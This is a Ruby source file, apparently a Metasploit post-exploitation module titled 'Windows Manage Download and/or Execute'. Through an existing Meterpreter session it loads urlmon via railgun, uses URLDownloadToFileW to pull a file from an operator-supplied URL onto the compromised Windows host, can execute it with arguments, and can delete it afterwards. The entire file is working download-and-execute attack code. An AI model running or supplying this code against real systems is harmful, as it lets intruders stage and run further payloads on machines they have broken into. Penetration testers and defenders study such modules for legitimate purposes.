##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Manage Download and/or Execute',
        'Description' => %q{
          This module will download a file by importing urlmon via railgun.
          The user may also choose to execute the file with arguments via exec_string.
        },
        'License' => MSF_LICENSE,
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Author' => ['RageLtMan <rageltman[at]sempervictus>'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_fs_delete_file
              stdapi_fs_file_expand_path
              stdapi_fs_stat
              stdapi_railgun_api
              stdapi_sys_config_getenv
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('URL', [true, 'Full URL of file to download' ]),
        OptString.new('DOWNLOAD_PATH', [false, 'Full path for downloaded file' ]),
        OptString.new('FILENAME', [false, 'Name for downloaded file' ]),
        OptBool.new('OUTPUT', [true, 'Show execution output', true ]),
        OptBool.new('EXECUTE', [true, 'Execute file after completion', false ]),
      ]
    )

    register_advanced_options(
      [
        OptString.new('EXEC_STRING', [false, 'Execution parameters when run from download directory' ]),
        OptInt.new('EXEC_TIMEOUT', [true, 'Execution timeout', 60 ]),
        OptBool.new('DELETE', [true, 'Delete file after execution', false ]),
      ]
    )
  end

  # Check to see if our dll is loaded, load and configure if not

  def add_railgun_urlmon
    if client.railgun.libraries.find_all { |d| d.first == 'urlmon' }.empty?
      session.railgun.add_dll('urlmon', 'urlmon')
      session.railgun.add_function(
        'urlmon', 'URLDownloadToFileW', 'DWORD',
        [
          ['PBLOB', 'pCaller', 'in'],
          ['PWCHAR', 'szURL', 'in'],
          ['PWCHAR', 'szFileName', 'in'],
          ['DWORD', 'dwReserved', 'in'],
          ['PBLOB', 'lpfnCB', 'inout']
        ]
      )
      vprint_good('urlmon loaded and configured')
    else
      vprint_status('urlmon already loaded')
    end
  end

  def run
    # Make sure we meet the requirements before running the script, note no need to return
    # unless error
    return 0 if session.type != 'meterpreter'

    # get time
    strtime = Time.now

    # check/set vars
    url = datastore['URL']
    filename = datastore['FILENAME'] || url.split('/').last

    path = datastore['DOWNLOAD_PATH']
    if path.blank?
      path = session.sys.config.getenv('TEMP')
    else
      path = session.fs.file.expand_path(path)
    end

    outpath = path + '\\' + filename
    exec = datastore['EXECUTE']
    exec_string = datastore['EXEC_STRING']
    output = datastore['OUTPUT']
    remove = datastore['DELETE']

    # set up railgun
    add_railgun_urlmon

    # get our file
    vprint_status("Downloading #{url} to #{outpath}")
    client.railgun.urlmon.URLDownloadToFileW(nil, url, outpath, 0, nil)

    # check our results
    begin
      out = session.fs.file.stat(outpath)
      print_status("#{out.stathash['st_size']} bytes downloaded to #{outpath} in #{(Time.now - strtime).to_i} seconds ")
    rescue StandardError
      print_error('File not found. The download probably failed')
      return
    end

    # Execute file upon request
    if exec
      begin
        cmd = "\"#{outpath}\" #{exec_string}"

        print_status("Executing file: #{cmd}")
        res = cmd_exec(cmd, nil, datastore['EXEC_TIMEOUT'])
        print_good(res) if output && !res.empty?
      rescue StandardError => e
        print_error("Unable to execute: #{e.message}")
      end
    end

    # remove file if needed
    if remove
      begin
        print_status("Deleting #{outpath}")
        session.fs.file.rm(outpath)
      rescue StandardError => e
        print_error("Unable to remove file: #{e.message}")
      end
    end
  end
end
